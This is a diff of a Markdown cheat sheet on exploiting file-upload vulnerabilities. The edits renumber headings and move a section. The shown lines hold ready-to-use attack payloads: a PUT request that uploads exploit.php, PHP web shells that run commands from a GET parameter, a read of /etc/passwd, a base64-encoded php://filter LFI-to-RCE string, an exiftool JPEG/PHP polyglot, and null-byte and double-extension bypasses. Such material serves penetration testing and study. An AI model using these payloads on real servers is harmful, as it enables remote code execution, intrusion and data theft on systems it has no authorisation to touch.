@@ -6,7 +6,7 @@
 2. [Image Upload with Embedded PHP Code](#2-image-upload-with-embedded-php-code)  
 3. [Bypassing Content-Type Validation](#3-bypassing-content-type-validation)
 4. [Uploading Files via Path Traversal Vulnerability](#4-uploading-files-via-path-traversal-vulnerability)  
-5. [Uploading Files Using PUT](#uploading-files-using-put)
+5. [Uploading Files Using PUT](#5-uploading-files-using-put)
 7. [PHP Payloads for RCE](#php-payloads-for-rce)  
    - [Normal Payloads](#normal-payloads)  
    - [Exploiting Server Configuration](#exploiting-server-configuration)  
@@ -106,7 +106,7 @@ In some cases, you can exploit file upload vulnerability via path traversal:
 
 ---
 
-## **Uploading Files Using PUT**
+### **5. Uploading Files Using PUT**
 
 ```text
 PUT /images/exploit.php HTTP/1.1
@@ -116,20 +116,6 @@ Content-Length: 49
 
 <?php echo file_get_contents('/path/to/file'); ?>
 ```
-
-## **PHP Payloads for RCE**
-
-### **Normal Payloads**
-```php
-<?php echo file_get_contents('/etc/passwd'); ?> // To read files
-<?php system($_GET['cmd']); ?> // For system command
-<?php passthru($_GET['cyborg71']); ?> // For system command*
-php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+&cmd=ls // LFI to RCE
-exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" hacker.jpg -o polyglot.php
-```
-
----
-
 ### **Exploiting Server Configuration**
 
 #### **Apache Bypass**
@@ -181,6 +167,17 @@ Content-Type: application/x-httpd-php
 .php%00.jpg
 .php%00.png
 .p.phphp
+```
+---
+
+## **PHP Payloads for RCE**
+
+```php
+<?php echo file_get_contents('/etc/passwd'); ?> // To read files
+<?php system($_GET['cmd']); ?> // For system command
+<?php passthru($_GET['cyborg71']); ?> // For system command*
+php://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+&cmd=ls // LFI to RCE
+exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" hacker.jpg -o polyglot.php
 ```
 ---
 
